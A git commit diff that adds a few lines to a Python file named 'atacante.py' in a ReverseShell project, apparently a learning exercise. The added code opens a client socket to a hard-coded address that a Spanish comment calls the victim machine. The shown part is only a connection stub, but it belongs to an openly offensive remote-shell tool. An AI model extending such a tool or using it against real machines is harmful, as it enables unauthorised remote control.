c1458afe51db6c4863c4fbbc5b91abe1b7784948
JoseGeek78 <josemariarodriguez78@gmail.com>
2024-10-09 15:48:28 +0200

    .

--- ReverseShell/atacante.py
+++ ReverseShell/atacante.py
@@ -1,4 +1,10 @@
 from socket import socket
 
+
 # Definimos la dirección y puerto del servidor (Siempre de la máquina víctima)
 server_address = ('192.168.6.38', 5000)
+
+# Creamos el socket cliente, ya que restablecemos la conexión a cada comando que se ejecute
+client_socket = socket()
+client_socket.connect(server_address)
+estado = True
